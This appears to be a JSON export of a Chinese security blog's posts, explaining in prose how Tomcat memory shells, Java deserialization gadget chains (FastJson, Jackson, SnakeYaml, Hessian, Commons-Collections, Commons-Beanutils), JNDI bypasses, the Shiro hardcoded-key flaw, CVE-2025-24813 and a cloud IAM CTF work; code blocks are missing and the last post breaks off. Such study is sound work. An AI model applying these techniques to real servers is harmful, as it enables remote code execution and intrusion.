[{"title":"Tomcat内存马学习","date":"2025-03-27T03:08:37.450Z","url":"/2025/03/27/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/","tags":[["Tomcat内存马","/tags/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"]],"categories":[["内存马","/categories/%E5%86%85%E5%AD%98%E9%A9%AC/"]],"content":"Tomcat中的三种context这里直接参考枫师傅的文章  Servlet型内存马假设某Web应用中有一个HelloServlet类，可以如下代码所示使用Tomcat去加载这个Servlet 内存马payload_demo 将写有Servlet内存马的servletShell.jsp上传到 WEB-INF目录下，启动Tomcat，访问servletShell.jsp触发代码注册恶意servlet，访问恶意servlet路由执行命令即可 先访问加载恶意servlet 然后访问 执行命令弹出计算器 Filter型内存马原理代码如下，若某个Filter拦截器中存在恶意代码，就会造成命令执行 访问*?cmd=xxxx就会经过filterShell拦截器执行恶意命令 在web.xml文件中，注册filter过滤器的写法如下 Filter过滤器执行逻辑分析 invoke:168, StandardWrapperValve (org.apache.catalina.core)调用doFilter的核心逻辑如下 跟进ApplicationFilterFactory.createFilterChain，核心逻辑伪代码如下 最后调用至internalDoFilter:168, ApplicationFilterChain (org.apache.catalina.core)，核心逻辑伪代码如下 由以上分析可得动态创建Filter过滤器并加载到filterChain中的两个关键步骤 内存马构造首先构造filterMap，StandardedContext类中存在方法addFilterMapBefore可以满足需求，但是需要先经过validateFilterMap方法的检查 validateFilterMap方法会检查StandardedContext类的filterDefs属性中是否含有filterName 所以在使用addFilterMapBefore添加filterMap之前需要对filterDefs属性提前赋值，恰好StandardedContext类中提供了addFilterDef方为filterDefs赋值 filterMap的构造解决了，最后需要解决context.findFilterConfig(filterMap.getFilterName()) 由于StandardedContext中未找到给filterConfigs赋值的方法，所以只能通过反射来赋值 Filter型内存马Payload最终如下所示 注意事项参考： Listener型内存马如图，Listener是最先被加载的，所以也可以构造Listener型内存马 由堆栈信息 -&gt; 跟进fireRequestInitEvent:5169, StandardContext (org.apache.catalina.core)，关键在于getApplicationEventListeners() 跟进getApplicationEventListeners() 和构造Filter型内存马的思路一样，寻找给applicationEventListenersList赋值的函数即可 利用addApplicationEventListener可以直接构造Listener型内存马了 Listener型内存马Payload如下所示 Tomcat内存马回显 Servlet内存马回显 Filter内存马回显 Listener内存马回显"},{"title":"C3P0链分析","date":"2025-03-25T05:08:32.877Z","url":"/2025/03/25/C3P0%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["C3P0链分析","/tags/C3P0%E9%93%BE%E5%88%86%E6%9E%90/"]],"categories":[["C3P0链分析","/categories/C3P0%E9%93%BE%E5%88%86%E6%9E%90/"]],"content":"URLClassloader链 JDNI链 通过Fastjson调用两个setter方法实现赋值并调用 Hex流反序列化也是结合Fastjson调用setter进行利用 参考"},{"title":"SnakeYaml反序列化漏洞分析","date":"2025-03-24T02:42:00.805Z","url":"/2025/03/24/SnakeYaml%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":[["SankeYaml反序列化","/tags/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["SankeYaml反序列化漏洞分析","/categories/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"]],"content":"SnakeYaml与Fastjson的功能对比SnakeYaml的功能是将一个java对象序列化为.yaml文件 &amp;&amp; 将.yaml文件反序列化回一个java对象 SnakeYaml的功能是将一个java对象序列化为.json文件 &amp;&amp; 将.json文件反序列化回一个java对象 映射与序列 所以这两种写法在SnakeYaml中对应着两个不同的构造函数 映射(Mapping)先用一个User类Demo进行调试分析 User.java SnakeYamlDemo.java 可以看到反序列化过程中调用了User类的无参构造方法和setter方法。 调用堆栈： 因为!!User &#123;age: 18, name: xiaobei&#125;属于映射，所以调用MappingNode的构造函数org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct，这里通过调用内置逻辑创建了User类的实例对象，跟进去看一下内置逻辑是怎么写的 最终的逻辑在org.yaml.snakeyaml.constructor.BaseConstructor#newInstance(java.lang.Class&lt;?&gt;, org.yaml.snakeyaml.nodes.Node, boolean)，通过反射机制获取并调用User类的无参构造方法，并调用创建User类的实例对象 继续返回跟进constructJavaBean2ndStep方法，在这个方法中会取出映射中的Key与Value的值，并利用反射机制调用User类的&#96;&#96;setter&#96;方法进行赋值 JdbcRowSetImpl链已知当SnakeYaml反序列化字符串为Mapping映射形式时，会调用反序列化目标类的无参构造方法和setter方法，所以思路1是利用JdbcRowSetImpl链打Jndi注入 序列(Sequence) 重新打断点跟进，和映射(Mapping)的逻辑有所不同，先来到org.yaml.snakeyaml.constructor.Constructor.ConstructYamlObject#construct 来到构造函数org.yaml.snakeyaml.constructor.Constructor.ConstructSequence，在for循环中进行递归调用，最后返回的是被赋完值的URLClassLoader对象 javax.script.ScriptEngineManager链工具项目地址： Java-SPI机制分析： Payload即上文序列(Sequence)调试的payload，工具利用方法参考README.md文件和文章：  SnakeYaml + C3P0C3P0链分析见 -&gt;  jndi链 Hex流反序化链与jndi链同理，构造相似payload即可，原理不做赘述 探测payloadpayload参考： URLDNS链参考： 写在最后感觉SnakeYaml反序列化的本质依然是对setter方法的调用，所以一些Fastjson的链子在SnakeYaml中也可以打，还是需要慢慢研究。"},{"title":"从Tomcat历史漏洞分析CVE-2025-24813","date":"2025-03-20T01:35:58.642Z","url":"/2025/03/20/Tomcat-PUT%E5%88%86%E6%9E%90/","tags":[["Tomcat","/tags/Tomcat/"]],"categories":[["Tomcat","/categories/Tomcat/"]],"content":"环境与调试(1) Tomcat各版本下载： (2) IDEA远程JVM调试： Tomcat PUT RCECVE-2017-12615 参考： 本质是利用构造特殊后缀名绕过JSPServlet的检测，执行DefaultServlet中的doPut逻辑，上传恶意jsp文件。 Tomcat Session反序列化CVE-2020-9484 首先在/conf/context.xml中开启会话管理器 PersistentManager 是 Tomcat 中的一种会话管理器，它允许 会话数据 在 Tomcat 重启或服务器停机时得以 持久化存储。默认情况下，Tomcat 的会话数据存储在内存中，但如果启用了 PersistentManager，会话数据会被写入到文件系统中，从而在 Tomcat 重启后保持会话状态。 className=&quot;org.apache.catalina.session.PersistentManager指定了使用PersistentManager来管理会话。 FileStore 是 PersistentManager 用来将会话数据存储到磁盘上的类。它将会话对象序列化为文件，存储在指定的目录中，支持跨服务器重启保持会话状态。 directory=&quot;/Users/gehansheng/Desktop/Java代码审计/Tomcat历史漏洞分析/apache-tomcat-10.0.0-M4/sessionFile&quot;为指定存储会话数据的目录文件。 既然FileStore会将会话数据序列化为文件，那么就会存在反序列化漏洞的风险，这个漏洞就是由此产生的。 使用CC链验证漏洞，先在/webapps/ROOT/WEB_INF/lib下添加commons-collections-3.2.1.jar包的依赖，然后使用ysoserial生成含有恶意序列化内容的payload.session文件 验证 - 命令执行 反序列化.session序列化文件的函数为org.apache.catalina.session.FileStore#load 调用逻辑大致如下 总结来看，这个漏洞的利用条件很高 Tomcat 文件上传 + session反序列化CVE-2025-24813 利用条件是 CVE-2017-12615 和 CVE-2020-9484 的汇总 漏洞流程大约如下 PUT /xxxxxx/session -&gt; /work/Catalina/localhost/ROOT/.xxxxxx.session的逻辑发生在org.apache.catalina.servlets.DefaultServlet#executePartialPut中 走到if中的前提条件是range不为空，跟进org.apache.catalina.servlets.DefaultServlet#parseContentRange，发现其为Content-Range请求头 构造请求头即可 那么只需要PUT恶意序列化字节码，就可以出发反序列化RCE了。 "},{"title":"WIZCTF The Big IAM Challenges","date":"2025-03-18T00:35:15.604Z","url":"/2025/03/18/WIZCTF%20The%20Big%20IAM%20Challenges/","tags":[["云安全","/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"]],"categories":[["云安全","/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"]],"content":"题目首先给出amazon-s3云存储的 IAM Policy 拥有遍历Bucket Object的权限 - &quot;Action&quot;: &quot;s3:ListBucket&quot;，使用命令行列出桶中的Object 将files/flag1.txt下载到指定目录并读取 Google Analytics SQS的队列URL格式如下所示 查看receive-message发现Body中的URL参数，访问得到flag 在前端HTML代码也可以获得QueueURL Enable Push Notification 给出的SNS的IAM策略如下所示 由于&quot;sns:Endpoint&quot;: &quot;*@tbic.wiz.io&quot;导致--notification-endpoint的值必须使用@tbic.wiz.io邮箱，可以使用http协议外带进行绕过 同时在VPS中监听101.xx.xx.105:2333端口，要先后监听两次，第一次为成功订阅，第二次为接收订阅后返回的信息 得到flag Admin only?也是一个s3存储桶的IAM策略 首先尝试列出files/下的文件看看都有哪些，结果权限不足Access Denied 根据给出的IAM策略可知ListBucket需要同时满足前缀为files/和请求者为admin用户这两个条件 由于这条策略，所以可以采取匿名访问，不需要进行签名 拿到了Key信息，直接使用get-object下载访问即可 Do I Know You? 根据策略，题目使用了AWS-Cognito 题目前端源代码中泄露了身份池identityPoolId 利用identityPoolId获取认证IdentityId 利用IdentityId生成临时凭据 然后可以使用临时凭证访问桶中数据信息，为此可以写一个HTML脚本来生成预签名URL 打开网页后在前端开发者工具控制台中输出预签名URL 访问执行listObjects操作，可以获得Key值为flag1.txt 修改脚本，利用getObject访问flag.txt即可拿到flag One final push 问了下GPT，使用AssumeRoleWithWebIdentity生成STS临时凭证的方法必须最少需要三个参数 题目中已经给了RoleArn-&gt;arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role RoleSessionName可以自定义 WebIdentity需要通过身份池Id来获取 手动输入总是因为少字符或换行符发生错误，索性让GPT生成了个JS脚本 拿到Flag - &#123;wiz:open-sesame-or-shell-i-say-openid&#125; "},{"title":"Hessian_Rome链分析","date":"2025-03-03T02:33:32.714Z","url":"/2025/03/03/Hessian_Rome%E9%93%BE/","tags":[["Hessian反序列化","/tags/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["Hessian反序列化","/categories/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"content":"Hessian_Rome链出网(JdbcRowSetImpl链)环境配置 调用流程 流程分析 com.rometools.rome.feed.impl.ToStringBean#toString(java.lang.String)会遍历beanClass中的所有getter方法 com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData方法调用了com.sun.rowset.JdbcRowSetImpl#connect()，可以触发JNDI注入，且符合条件为getter方法，是利用链的sink点 EXP 构造EXP需要注意的几个点 1、需要通过ClassPool.removeMethod提前移除JdbcRowSetImpl类中的getMatchColumnNames方法，否则会在执行getDatabaseMetaData()之前，执行getMatchColumnNames的时候发生报错 2、需要手动创建Node&lt;K,V&gt;[] table并存入利用反射存入键值对，因为直接使用map.put会提前触发hashCode方法导致提前命令执行。 为什么不直接使用TemplatesImplHessianInput.readObject不同于ObjectInputStream.readObject，HessianInput.readObject不会执行反序列化类重写的readObject方法，而TemplatesImpl类中的_tfactory为transient修饰，不可以被反序列化，这会导致空指针错误 正常的ObjectInputStream.readObject反序列化逻辑中，反序列化时调用TemplatesImpl 不出网(二次反序列化)既然HessianInput.readObject无法调用TemplatesImpl.readObject为_tfactory字段赋值，利用SignedObject.getObject二次反序列化BadAttributeValueExpException即可 调用链 EXP 利用链不稳定的点 当开始调用TemplatesImpl类中的getter方法时，会有顺序问题，若com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getStylesheetDOM方法的调用顺序在getoutProperties之前，则会出现空指针错误，这和Jackson利用链的不稳定的原因异曲同工 为什么不可以用反射为_sdom赋值 因为_sdom为transient修饰，无法被序列化，即使反射赋值，调用时依然为默认值null，且在TemplatesImpl.readObject并没有显示的为_sdom赋值的逻辑，导致空指针错误无法被有效解决 思考 通过阅读Jackson利用链的不稳定性，下面文章提出了使用动态代理的解决方案   但是在Hessian中的解决方法依然在思考中"},{"title":"Jackson反序列化JDK原生利用链","date":"2025-03-02T05:29:10.363Z","url":"/2025/03/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JDK%E5%8E%9F%E7%94%9F%E5%88%A9%E7%94%A8%E9%93%BE/","tags":[["Jackson","/tags/Jackson/"]],"categories":[["Jackson","/categories/Jackson/"]],"content":"前言与Fasyjson原生JDK反序列化利用相同，Jackson也可以结合原生JDK进行反序列化利用。且SpringBoot默认集成Jackson作为其JSON处理库，所以攻击面更广。 Gadget writeValueString正是Jackson序列化的入口函数，会调用序列化对象的所有public_getter方法。 分析POJONode类中没有toString方法，但其父类的父类BaseJsonNode拥有toString方法 nodeToString方法中调用了writeValueAString，进而调用恶意类的public_getter方法，如TemplatesImpl类中的getOutProperties方法 参考Fastjson原生反序列化利用，使用javax.management.BadAttributeValueExpException#readObject来触发POJONode.readObject方法 EXPTemplatesImpl链注：利用ClassPool删除了BaseJsonNode类中的writeReplace方法，否则在序列化payload时会报错 SignedObject二次反序列化"},{"title":"JDK_7u21链分析","date":"2025-03-02T00:58:45.168Z","url":"/2025/03/02/JDK_7u21%E9%93%BE/","tags":[["JDK原生反序列化","/tags/JDK%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["JDK原生反序列化","/categories/JDK%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"content":"前言由于macbook ARM架构没有对应的JDK7，所以对JDK_7u21JDK原生利用链的分析推迟了，返校后用windows补上。 环境配置JDK_7u21源码地址： IDEA中的SDK配置参考之前Commons-Collections1分析的那篇文章： Sink位置JDK_7u21链的sink点为sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl，equalsImpl方法中调用了memberMethod.invoke(o)，而memberMethod通过getMemberMethods()被遍历赋值为type类中的所有自定义方法。 当type为TemplatesImpl类时，通过调用equalsImpl方法便可调用getOutProperties方法，实现代码执行。 寻找调用链现在寻找能够触发equalsImpl方法的链子。equalsImpl方法在sun.reflect.annotation.AnnotationInvocationHandler#invoke中被调用，首先可以想到使用动态代理触发invoke，进而调用equalsImpl。跟进invoke方法查看equalsImpl的触发条件 需要满足动态代理对象proxy的调用方法必须为equals。 众所周知HashSet是一种用来去重的数据结构， 通过将对象保存在HashMap的Key处来做去重，HashSet.readObject方法如下所示 跟进map.put方法，查看其去重的逻辑，发现其调用了equals方法 if语句中的调用顺序如下 故触发equals的条件是两个不同对象的哈希值相等。故接下来让proxy对象的哈希值等于TemplatesImpl对象的哈希值即可。 构造相等哈希值的不同对象java.util.HashMap#put中的哈希值计算使用int hash = hash(key);，跟进hash方法，它会调用Key.hashCode方法 但这将会触发动态代理，调用sun.reflect.annotation.AnnotationInvocationHandler#invoke，进而触发hashCodeImpl方法 跟进hashCodeImpl方法，使用(127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue())来计算hashCode并返回 这个计算方法产生了利用点，0^x = x(x为任意值)，只要让memberValues的Key为某个hashCode值为0的字符串，value为TemplatesImpl对象，这样它返回的值恒为TemplatesImpl对象的hashCode。这样整条链子就齐了。 引用P神《Java安全漫谈》中的代码跑出hashCode值为0的字符串 字符串为f5a5a608 EXP"},{"title":"初探Jackson反序列化漏洞","date":"2025-02-24T05:57:03.918Z","url":"/2025/02/24/%E5%88%9D%E6%8E%A2Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","tags":[["Jackson","/tags/Jackson/"]],"categories":[["Jackson","/categories/Jackson/"]],"content":"前言关于Jackson的介绍和用法，王网上已经有很多全面的文章进行分析讲解，不做过多的赘述了，参考下列文章即可。   对于setter、getter调用逻辑的思考上述文章中对于Jackson反序列化调用setter、getter方法的描述过于冗杂且不清晰，故想用自己的话和理解重新写一下。 在com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize中，会根据属性从this._beanProperties寻找对应的调用方法 调用setter/getter，在com.fasterxml.jackson.databind.deser.BeanDeserializerFactory#addBeanProps中可以看到对应逻辑 (1) 首先看是否有setter方法，若有则调用setter (2) 若没有setter方法，其次查看有无这个子段 条件 结果 字段访问属性为public，无getter方法 根据字段反射赋值，正常反序列化 字段访问属性为private，有public getter方法 正常反序列化 字段访问属性为private，无getter&#x2F;有private getter方法 无法正常反序列化 (3) 若setter和字段都没有，最后调用public getter方法，前提是getter方法的返回值必须是Collection、Map以及它们的字类 其实这就顺带解释了CVE-2017-7525 (基于TemplatesImpl的Jackson反序列化利用链)为什么能触发getOutProperties方法，因为TemplatesImpl类中既没有setOutProperties方法也没有outProperties字段，且getOutProperties的返回值Properties类是Map的字类。 CVE-2017-7525 (TemplatesImpl链)影响版本 Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 JDK &lt; jdk7u80 EXP 可以注意到与Fastjson_Templates利用链的不同点，Jackson使用了transletBytecodes和transletName替换了_bytecodes和_name，因为jackson反序列化需要调用它们的setter方法进行赋值 JDK版本限制 为什么JDK7u13可以，JDK7u80不行呢，原因是对_tfactory参数的处理 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses中，加载恶意字节码之前会走进一个其它的逻辑 可以看到JDK7u13中没有调用_tafactory，而JDK7u80调用了_tfactory _tfactory在TemplatesImpl类中的默认值为null，调用null的方法会报错空指针异常 且_tfactory字段的访问属性为private，且无setter/getter方法，导致无法在Jackson反序列化的过程中被赋值 修复 在com.fasterxml.jackson.databind.deser.BeanDeserializerFactory引入黑名单 在创建反序列化器的时候，调用到com.fasterxml.jackson.databind.deser.BeanDeserializerFactory#createBeanDeserializer时会调用checkIllegalTypes方法，进行黑名单检测 提取类名在黑名单中找，若在黑名单中直接抛出异常 "},{"title":"FastJson反序列化不出网利用与一些细节实现","date":"2025-02-17T04:33:00.107Z","url":"/2025/02/17/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E4%B8%8E%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"细节的思考1、首先是关于 parse和 parseObject，二者都可以将 JSON字符串反序列化为 Java对象，不同的代码可能会采用不同的反序列化方法。 加入要反序列化的 jsonString如下所示： 三种反序列化方式对应三种不同的结果： (1) JSON.parse(jsonString) 当JSON字符串包含@type属性时，FastJSON会尝试实例化指定类。 调用顺序： 调用无参构造方法创建对象实例。 调用setter方法：根据JSON键名匹配目标类的 setter()方法（若存在）。 直接赋值字段：若没有setter方法，则直接通过反射修改字段（需字段为 public或启用Feature.SupportNonPublicField）。 触发getter方法：调用某些特殊的符合条件的 getter()，如果JSON中存在某些特殊逻辑（如 JSONObject嵌套），可能在反序列化过程中意外触发 getter()。 (2) JSON.parseObject(jsonString) 包含 @type时与 parse()行为一致，会实例化指定类并调用setter&#x2F;字段。 额外调用 getter： 由于parseObject()会尝试将结果转为 JSONObject，会自动调用目标对象的所有 getter方法以获取属性值。 这会导致 getter方法中的逻辑被触发 (即使JSON中未显式包含对应键)。 (3) JSON.parseObject(jsonString, Target.class) 直接解析 JSON字符串到指定类 Target.class，忽略 @type属。 后续逻辑与 JSON.parse()相似，只不过是在 Target.class中进行调用罢了，若 Target.class无危险逻辑，则不会出现安全漏洞。 parse调用 getter()绕过Fastjson &lt;&#x3D; 1.2.36反序列化时首先得到一个JSONObject对象，然后将该JSONObject对象置于”JSON Key”的位置。Fastjson在反序列化时会对”JSON Key”自动调用JSON.toString()。JSONObject是Map的子类，执行toString()时会将当前对象转为字符串形式，会提取类中所有Field，自然会执行相应的getter、is等方法 – Kingx师傅的解释，在这里直接引用了。 为什么 Fastjson &gt; 1.2.36不能利用这种绕过调用 getter了 （参考 jlkl师傅） Fastjson &gt;&#x3D; 1.2.36 Fastjson不出网利用TemplatesImple链TemplatesImpl链在之前提到过，利用字节码加载恶意类RCE，由于 private属性的限制需要开启 Feature.SupportNonPublicField，很鸡肋。 BasicDataSource链依赖：Tomcat数据库驱动组件 tomcat-dbcp 调用链 - org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection() –&gt; createDataSource() –&gt; createConnectionFactory() 先给出 EXP JSON.parse(jsonString) Fastjson &lt;&#x3D; 1.2.36 JSON.parse(jsonString) Fastjson &gt;&#x3D; 1.2.36 JSON.parseObject(jsonString) 首先通过触发 getConnection()方法调用 createDataSource()方法 createDataSource()方法调用 createConnectionFactory()方法 createConnectionFactory()方法调用 DriverFactory.createDriver()方法 跟进，来到 sink点Class.forName(driverClassName, true, driverClassLoader); 根据 P神《Java安全漫谈》第一篇文章的内容可知，当使用 Class.forName()时，第二个参数 initial为 true时，类加载后将会直接执行 static{}静态代码块中的代码 其中 driverClassLoader和 driverClassName可控 (调用 setter)，接下来寻找一个可以利用的恶意类即可 需要额外关注的是 driverClassLoader，即 exp中的 com.sun.org.apache.bcel.internal.util.ClassLoader 如果 class_name以 $$BCEL$$开头，则取 $$BCEL$$之后的部分解码后作为 class的字节码，并调用 defineClass获取 class对象。 这条链子到这里就齐了，在恶意类静态代码块中写恶意代码，构造 $$BCEL$$恶意字节码通过 fastjson赋值给 driverClassName，并将类加载器 com.sun.org.apache.bcel.internal.util.ClassLoader赋值给driverClassLoader，就可以在不出网反连的条件下执行恶意代码了。 版本的局限性1、绿盟官方对于 BasicDataSource链在 Fastjson各版本的利用进行了测试  BasicDataSource链不出网利用只适用于 Fastjson &lt;&#x3D; 1.2.24，因为从 Fastjson &gt;&#x3D; 1.2.25开始，checkAutoType中对 BasicDataSource进行了单独的检测，无法绕过 L … ; 只能帮助绕过黑名单限制 2、BasicDataSource类在不同版本的 tomcat-dbcp包中有不同的位置，参考 KINGX师傅的 blog 参考文章 – P神对于 $$BCEL$$的解释  – KINGX  – 绿盟  – Y4tacker, $ref调用 getter  – KINGX, FastJson反序列化漏洞利用的三个细节 "},{"title":"jndi注入高版本JDK绕过","date":"2025-02-13T01:00:20.948Z","url":"/2025/02/13/jndi%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87/","tags":[["jndi注入","/tags/jndi%E6%B3%A8%E5%85%A5/"]],"categories":[["jndi注入","/categories/jndi%E6%B3%A8%E5%85%A5/"]],"content":"前言jndi注入本质是 lookup()方法参数值可控，attacker可以通过使其加载恶意 rmi&#x2F;ldap服务造成命令执行。 Oracle openJDK8u121之后在 loadClass方法中引入 trustURLCodeBase来限制 rmi对于 codebase的远程加载，但是忘记考虑了 ldap的利用，所以 8u121 - 8u191之间的绕过方法是利用 ldap绕过。 Oracle openJDK8u191之后官方修复了 ldap的利用，修复原理同上，无法进行远程加载类实例化&#x2F;执行静态代码块代码。 所以思考如何了利用本地已有类进行绕过。 JDK&gt;&#x3D;8u191绕过除了 trustURLCodebase外，com.sun.jndi.rmi.registry.RegistryContext#decodeObject 中限制了 FactoryClassLocation必须为 null，否则抛出异常 所以第一次绕过就是 factoryLocation为 null 第二个绕过点就是 javax.naming.spi.NamingManager#getObjectFactoryFromReference 可以尝试加载本地类，使用加载的本地类对象调用 factory.getObjectInstance方法实现命令执行 因为返回对象是 ObjectFactory类型，所以加载的本地类必须实现 ObjectFactory接口 恰巧 tomcat中的一个类 org.apache.naming.factory.BeanFactory 类不仅实现了 ObjectFactory接口，并且 org.apache.naming.factory.BeanFactory#getObjectInstance 中调用了 method.invoke方法，给了命令执行可乘之机 EXP构造(1) javax.el.ELProcessor，需要 tomcat依赖 (2) 使用 groovy，需要 groovy依赖 参考  "},{"title":"Commons-Beanutils链反序列化分析","date":"2025-02-11T01:48:15.038Z","url":"/2025/02/11/CB%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Shiro","/tags/Shiro/"]],"categories":[["Shiro","/categories/Shiro/"]],"content":"Shiro中不自带 Commons-Collections依赖，但是自带 Commons-Beanutils依赖，故可以尝试使用 CB链打 Shiro反序列化漏洞。 Commons-beanutilsCommons-Beanutils 是 Apache 软件基金会提供的一个开源 Java 库，旨在简化 Java Bean 对象的操作。它提供了便捷的工具来访问和修改 Java Bean 的属性，尤其是在动态或复杂的属性操作时，它使得代码更加简洁和高效。 User类，一个普通的 JavaBean： 正常调用 JavaBean： 使用 commons-beanutils调用 JavaBean： 分析 TemplatesImpl时，类中有个 getter方法 - getOutputProperties也调用了 TemplatesImpl.newTransformer： 可以在 Shiro中找哪里调用了 PropertyUtils.getProperty，构造 exp。 完整 EXP EXP构造逻辑1、首先已经确认了 PropertyUtils.getProperty(templates, “outputProperties”); 实现命令执行的目标，查找 getPropertyUtils调用位置，其在 BeanComparator中可控，property在构造函数中被赋值： 2、查找 compare的用法，可以结合 CC4链的思路，java.util工具类中的 PriorityQueue类中的 readObject方法调用了 compare，正好符合反序列化条件： comparator可以在构造函数中赋值可控： EXP构造坑点：1、向队列中第二次添加数据 - priorityQueue.add(1)时，提前触发 comparator.compare方法，到达下图断点位置，要在 Integer类中查找调用 getOutputProperties方法，但是 Integer类中没有这个 getter方法，从而产生报错： 可以利用 TransformingComparator类中的 compare方法，结合 new ConstantTransformer(1)返回常量，transformer在构造函数中赋值可控，虽然 TransformingCoparator是 commons-collections中的类，但是只是为了 priorityQueue.add(1)提前命令执行导致后续代码无法正常执行，不影响最终的序列化和反序列化结果： 具体实现代码： 2、完全原生打 Shiro时，只有 commons-beanutils没有 commons-collections，但是 BeanComparator单参构造函数中使用了 CC中的类，会导致报错 - 找不到这个类： 可以使用它的另一个构造函数，手动赋值 comparator 前提是实现了 Serializable接口(可以被反序列化)，并且依赖中存在，AttrCompare类就符合条件，构造即可： cb链打 Shiro反序列化漏洞复现： "},{"title":"Shiro硬编码反序列化","date":"2025-02-10T03:00:44.732Z","url":"/2025/02/10/shiro%20%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":[["Shiro","/tags/Shiro/"]],"categories":[["Shiro","/categories/Shiro/"]],"content":"环境搭建Apache-Shiro 1.2.4:  参考 Y4er:  (Windows) Shiro -1.2.4 - sample - web environment for Mac： 1、首先确认 ~&#x2F;.m2&#x2F;toolchains.xml存在 - ls -l ~/.m2/toolchains.xml： 不存在则 touch ~/.m2/toolchains.xml，存在则 nano ~/.m2/toolchains.xml编辑即可。 2、~&#x2F;.m2&#x2F;toolchains.xml （版本和 jdk信息和 pom.xml一致即可）: 3、根目录 mvn clean package构建工件 war包，Tomcat部署启动： 漏洞分析加解密流程 1、CookieRememberMeManager.getRememberedSerializedIdentity从 Cookie中读数据并使用 Base64解密： 2、查找 CookieRememberMeManager.getRememberedSerializedIdentity用法，在AbstractRememberMeManager.getRememberedPrincipals被调用，向下跟进 convertBytesToPrincipals： AES解密后进行反序列化，跟进 decrypt： 使用 getDecryptionCipherKey()获取 AES_KEY： 向上跟进最后可知 AES_KEY为硬编码密钥，可以进行数据伪造： 加密exppython Java参考 ShiroAttack2 - Encrypt.java  漏洞利用1、特征判断：请求包 Cookie构造 rememberMe&#x3D;123; -&gt; 响应 rememberMe&#x3D;deleteMe 自动化利用工具 ShiroAttack2 ()"},{"title":"Commons-Collections-CC7链分析","date":"2025-02-09T05:47:59.914Z","url":"/2025/02/09/CC7%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"CC7链较之前分析的调用链相比更加复杂，构造 exp的坑点也更多。 完整 EXP EXP构造逻辑可以参考 ysoserial中的 CommonsCollections7.java () 1、LazyMap.get方法可以在 AbstractMap.equals中被调用： 2、AbstractMap.equals可以在 AbstractMapDecorator.equals中被调用： 3、AbstractMapDecorator.equals可以在 Hashtable.reconstitutionPut中被调用： 4、Hashtable.reconstitutionPut在 Hashtable.readObject中被调用： EXP构造坑点1、hashtable.put(lazyMap2, 2)提前触发 equals导致提前命令执行： 利用前几条链的思路，先给 lazyMap2的 factory属性使用 new ConstantTransformer赋值，hash table.put(lazyMap2,2)之后再利用反射修改会 chainedTransformer： 2、hashtable.put(lazyMap2,2)时，经过 LazyMap.get方法时会将 lazyMap1中的键 “yy”添加到 lazyMap2中，导致反序列化时不执行 transform，导致不能命令执行： 所以需要在 hashtable.put(lazyMap2,2)之后删除 lazyMap2中的 “yy”键： 3、new ConstantTransformer(?) 中 ?的值不能和 hash table.put(lazyMap2, value)中的 value值相同，否则不会触发 hashtable.put(lazyMap2, value)中的 addEntry方法，导致后续代码无法正常执行： 打断点跟进 hashtable.put(lazyMap2, value)的逻辑中，跟进 entry.key.equals(key)，在 AbstractMap.equals方法中进行了判断，若这两个值相同，则会返回 true： 后果就是在 hashtable.put中，直接进入到 if逻辑中，return old而不是执行 addEntry方法，导致后续代码无法正常执行： 4、lazyMap1和 lazyMap2计算后的 hash值需要相同，因为使用了 &amp;&amp;，若左侧语句为 false，则不会执行右侧代码，即不会执行 entry.key.equals(key)： CC6 + CC7分析 CC7的过程中可以看到 Hashtable.reconstitutionPut中调用了 key.hashCode方法，故可以联合利用 CC6中的 TiedMapEntry.hashCode进行组合利用： 完整 EXP 调用链流程图"},{"title":"Commons-Collections-CC2、CC4链分析","date":"2025-02-09T01:16:32.310Z","url":"/2025/02/09/CC4+CC2%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"之前的几条CC链都是 Commons-Collections 3.2.1版本中的，CC4和CC2链是 Commons-Collections 4.0版本中的 Java反序列化利用链。 CC4完整 EXP EXP构造逻辑1、在 Commons-Collections 4.0中查找 ChainedTransformer.transform的用法，发现在 TransformingComparator.compare中被调用： 2、compare方法可以在 